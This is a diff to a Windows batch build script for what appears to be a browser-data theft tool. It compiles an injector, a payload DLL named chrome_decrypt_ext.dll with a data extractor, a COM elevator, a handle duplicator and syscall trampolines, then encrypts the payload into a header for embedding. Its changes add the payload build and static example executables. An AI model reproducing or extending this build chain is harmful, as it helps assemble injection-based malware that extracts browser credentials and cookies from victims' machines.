@@ -138,11 +138,16 @@ cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\pipe_serv
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector.cpp" /Fo"%BUILD_DIR%\injector.obj"
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\sys\internal_api.cpp" /Fo"%BUILD_DIR%\internal_api.obj"
 
+echo [5/5] Linking Injector to "%FINAL_EXE_NAME%" ...
 link %LFLAGS_COMMON% %LFLAGS_MERGE% /OUT:".\%FINAL_EXE_NAME%" ^
-    "%BUILD_DIR%\injector_main.obj" "%BUILD_DIR%\browser_discovery.obj" ^
-    "%BUILD_DIR%\browser_terminator.obj" "%BUILD_DIR%\process_manager.obj" ^
-    "%BUILD_DIR%\pipe_server.obj" "%BUILD_DIR%\injector.obj" ^
-    "%BUILD_DIR%\internal_api.obj" "%BUILD_DIR%\chacha20.obj" ^
+    "%BUILD_DIR%\injector_main.obj" ^
+    "%BUILD_DIR%\browser_discovery.obj" ^
+    "%BUILD_DIR%\browser_terminator.obj" ^
+    "%BUILD_DIR%\process_manager.obj" ^
+    "%BUILD_DIR%\pipe_server.obj" ^
+    "%BUILD_DIR%\injector.obj" ^
+    "%BUILD_DIR%\internal_api.obj" ^
+    "%BUILD_DIR%\chacha20.obj" ^
     "%BUILD_DIR%\syscall_trampoline.obj" ^
     version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib
 goto :eof
@@ -151,34 +156,126 @@ goto :eof
 
 :compile_dll
 echo [6/5] Compiling DLL...
+del "%BUILD_DIR%\*.o" "%BUILD_DIR%\chrome_decrypt_ext.dll"
+
+cl %CFLAGS_COMMON% /std:c++17 /EHs-c- /c "%SRC_DIR%\sys\bootstrap.cpp" /Fo"%BUILD_DIR%\bootstrap.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%\sqlite" /c "%SRC_DIR%\payload\payload_main_ext.cpp" /Fo"%BUILD_DIR%\payload_main_ext.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\com\elevator.cpp" /Fo"%BUILD_DIR%\elevator.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\payload\messages.cpp" /Fo"%BUILD_DIR%\messages.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\payload\pipe_client.cpp" /Fo"%BUILD_DIR%\pipe_client.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\payload\pipe_client_ext.cpp" /Fo"%BUILD_DIR%\pipe_client_ext.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%\sqlite" /c "%SRC_DIR%\payload\data_extractor.cpp" /Fo"%BUILD_DIR%\data_extractor.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\crypto\aes_gcm.cpp" /Fo"%BUILD_DIR%\aes_gcm.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\crypto\chacha20.cpp" /Fo"%BUILD_DIR%\chacha20.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\payload\handle_duplicator.cpp" /Fo"%BUILD_DIR%\handle_duplicator.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\sys\internal_api.cpp" /Fo"%BUILD_DIR%\internal_api_payload.o"
+
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\core\logger.cpp" /Fo"%BUILD_DIR%\logger.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\core\pipe_element.cpp" /Fo"%BUILD_DIR%\pipe_element.o"
+
+
+
+:: Compile syscall trampoline for payload DLL
+if "%VSCMD_ARG_TGT_ARCH%"=="arm64" (
+    armasm64.exe -nologo "%SRC_DIR%\sys\syscall_trampoline_arm64.asm" -o "%BUILD_DIR%\syscall_trampoline_payload.o"
+) else (
+    ml64.exe /nologo /c /Fo"%BUILD_DIR%\syscall_trampoline_payload.o" "%SRC_DIR%\sys\syscall_trampoline_x64.asm"
+)
+
+link %LFLAGS_COMMON% %LFLAGS_MERGE% /DLL /OUT:"%BUILD_DIR%\chrome_decrypt_ext.dll" ^
+    "%BUILD_DIR%\payload_main_ext.o" ^
+    "%BUILD_DIR%\bootstrap.o" ^
+    "%BUILD_DIR%\elevator.o" ^
+    "%BUILD_DIR%\pipe_client.o" ^
+    "%BUILD_DIR%\messages.o" ^
+    "%BUILD_DIR%\pipe_client_ext.o" ^
+    "%BUILD_DIR%\data_extractor.o" ^
+    "%BUILD_DIR%\aes_gcm.o" ^
+    "%BUILD_DIR%\chacha20.o" ^
+    "%BUILD_DIR%\handle_duplicator.o" ^
+    "%BUILD_DIR%\internal_api_payload.o" ^
+    "%BUILD_DIR%\syscall_trampoline_payload.o" ^
+    "%BUILD_DIR%\logger.o" ^
+    "%BUILD_DIR%\pipe_element.o" ^
+    "%BUILD_DIR%\sqlite3.lib" ^
+    bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib crypt32.lib advapi32.lib kernel32.lib user32.lib libvcruntime.lib libucrt.lib
+
+:: Run the encryptor to generate the encrypted payload and header file
+"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" "%BUILD_DIR%\chrome_decrypt_ext.dll" "%BUILD_DIR%\chrome_decrypt_ext.enc" "%BUILD_DIR%\payload_data_ext.hpp"
+
+
+:: Compile syscall trampoline for injector DLL, actual library file
 if "%VSCMD_ARG_TGT_ARCH%"=="arm64" (
     armasm64.exe -nologo "%SRC_DIR%\sys\syscall_trampoline_arm64.asm" -o "%BUILD_DIR%\syscall_trampoline.o"
 ) else (
     ml64.exe /nologo /c /Fo"%BUILD_DIR%\syscall_trampoline.o" "%SRC_DIR%\sys\syscall_trampoline_x64.asm"
 )
 
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\core\logger.cpp" /Fo"%BUILD_DIR%\logger.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\core\pipe_element.cpp" /Fo"%BUILD_DIR%\pipe_element.o"
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector_api.cpp" /Fo"%BUILD_DIR%\injector_api.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\serializer.cpp" /Fo"%BUILD_DIR%\serializer.o"
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\payload\messages.cpp" /Fo"%BUILD_DIR%\messages.o"
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_discovery.cpp" /Fo"%BUILD_DIR%\browser_discovery.o"
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_terminator.cpp" /Fo"%BUILD_DIR%\browser_terminator.o"
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\process_manager.cpp" /Fo"%BUILD_DIR%\process_manager.o"
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\pipe_server.cpp" /Fo"%BUILD_DIR%\pipe_server.o"
-cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector.cpp" /Fo"%BUILD_DIR%\injector.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\pipe_server_ext.cpp" /Fo"%BUILD_DIR%\pipe_server_ext.o"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /D BUILD_API /c "%SRC_DIR%\injector\injector.cpp" /Fo"%BUILD_DIR%\injector.o"
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\sys\internal_api.cpp" /Fo"%BUILD_DIR%\internal_api.o"
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\crypto\chacha20.cpp" /Fo"%BUILD_DIR%\chacha20.o"
 
 link %LFLAGS_COMMON_DLL% %LFLAGS_COMMON% %LFLAGS_MERGE% /DLL /OUT:"%BUILD_DIR%\lib.dll" ^
-    "%BUILD_DIR%\injector_api.o" "%BUILD_DIR%\messages.o" "%BUILD_DIR%\browser_discovery.o" ^
-    "%BUILD_DIR%\browser_terminator.o" "%BUILD_DIR%\process_manager.o" ^
-    "%BUILD_DIR%\pipe_server.o" "%BUILD_DIR%\injector.o" ^
-    "%BUILD_DIR%\internal_api.o" "%BUILD_DIR%\chacha20.o" ^
+    "%BUILD_DIR%\injector_api.o" ^
+    "%BUILD_DIR%\serializer.o" ^
+    "%BUILD_DIR%\messages.o" ^
+    "%BUILD_DIR%\browser_discovery.o" ^
+    "%BUILD_DIR%\browser_terminator.o" ^
+    "%BUILD_DIR%\process_manager.o" ^
+    "%BUILD_DIR%\pipe_server.o" ^
+    "%BUILD_DIR%\pipe_server_ext.o" ^
+    "%BUILD_DIR%\pipe_element.o" ^
+    "%BUILD_DIR%\injector.o" ^
+    "%BUILD_DIR%\internal_api.o" ^
+    "%BUILD_DIR%\logger.o" ^
+    "%BUILD_DIR%\chacha20.o" ^
     "%BUILD_DIR%\syscall_trampoline.o" ^
     version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib
 
 :: compile to executable the examples/simple/main.cpp with lib.dll
 mkdir "%BUILD_DIR%\examples\simple" 2>nul
+del /q "%BUILD_DIR%\examples\simple\main.o" 2>nul
+del /q "%BUILD_DIR%\simple.exe" 2>nul
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\..\examples\simple\main.cpp" /Fo"%BUILD_DIR%\examples\simple\main.o"
-link %LFLAGS_COMMON% /OUT:"%BUILD_DIR%\simple.exe" "%BUILD_DIR%\examples\simple\main.o" "%BUILD_DIR%\lib.lib" version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib
+
+link %LFLAGS_COMMON% /OUT:"%BUILD_DIR%\simple.exe" ^
+    "%BUILD_DIR%\examples\simple\main.o" ^
+    "%BUILD_DIR%\lib.lib" version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib
+
+echo Creating simple_static.exe
+link %LFLAGS_COMMON% %LFLAGS_MERGE% /OUT:"simple_static.exe" ^
+    "%BUILD_DIR%\examples\simple\main.o" ^
+    "%BUILD_DIR%\browser_discovery.o" ^
+    "%BUILD_DIR%\browser_terminator.o" ^
+    "%BUILD_DIR%\process_manager.o" ^
+    "%BUILD_DIR%\pipe_server.o" ^
+    "%BUILD_DIR%\injector.o" ^
+    "%BUILD_DIR%\internal_api.o" ^
+    "%BUILD_DIR%\pipe_element.o" ^
+    "%BUILD_DIR%\logger.o" ^
+    "%BUILD_DIR%\chacha20.o" ^
+    "%BUILD_DIR%\syscall_trampoline.o" ^
+    "%BUILD_DIR%\injector_api.o" ^
+    "%BUILD_DIR%\serializer.o" ^
+    "%BUILD_DIR%\messages.o" ^
+    "%BUILD_DIR%\pipe_server_ext.o" ^
+    version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib
+
+:: compile to executable the examples/no_injection/main.cpp without any injection
+mkdir "%BUILD_DIR%\examples\no_injection" 2>nul
+del /q "%BUILD_DIR%\examples\no_injection\main.o" 2>nul
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\..\examples\no_injection\main.cpp" /Fo"%BUILD_DIR%\examples\no_injection\main.o"
+link %LFLAGS_COMMON% /OUT:"%BUILD_DIR%\no_injection.exe" "%BUILD_DIR%\examples\no_injection\main.o" crypt32.lib version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib ole32.lib oleaut32.lib
 
 goto :eof
 :done
